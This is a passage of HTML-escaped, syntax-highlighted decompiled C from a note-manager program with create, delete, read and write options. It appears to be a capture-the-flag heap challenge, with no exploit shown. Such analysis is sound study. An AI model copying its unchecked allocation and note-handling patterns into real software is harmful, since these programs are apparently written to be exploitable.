style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> **\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v1, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)())a3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    __asm_hlt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // UNREACHABLE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1110 - 0x1139\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1110\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1110\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">4018\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1140 - 0x1179\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1140\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1140\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1180 - 0x11c1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1180\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1180\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (g4 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x11c0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1180\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x118d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3ff8\u003C/span>\u003Cspan style=\"color:#F97583\"> !=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x119b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __cxa_finalize\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">4008\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1110\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x11a8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    g4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x11d0 - 0x11d9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_11d0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x11d0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1140\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x11d9 - 0x121c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> setup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x11d9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    setvbuf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(g3, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> setvbuf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(g2, \u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x121c - 0x1241\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> menu\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x121c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[ MENU ]\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[1] CREATE NOTE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[2] DELETE NOTE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[3] READ NOTE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[4] WRITE NOTE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[5] EXIT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1241 - 0x1428\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> create_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x124a\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x128b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v3 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g6);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v5;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1241\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v4 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x128b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v2\u003C/span>\u003Cspan style=\"color:#F97583\">++\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v2 \u003C/span>\u003Cspan style=\"color:#F97583\">>=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 10\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x129b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! NO SPACE FOR NEW NOTE !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x140e;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v3 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g6);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x12b4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"ENTER SIZE: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> size;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-44, 0x1241\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">size);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mem \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> malloc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)size);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x12eb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> str \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v3 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g5);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1306\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">str \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)mem;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (mem \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x133f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ENTER NOTE (MAX \u003C/span>\u003Cspan style=\"color:#79B8FF\">%d\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> CHARS): \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, size \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        getchar\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        fgets\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">str, (\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)size, g3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> str2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">str;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x139e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(str2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">strcspn\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)str2, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C; BACK\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x1326\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! MEMORY ALLOCATION FAILED !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x140e;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  lab_0x140e:;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v5;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x141b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 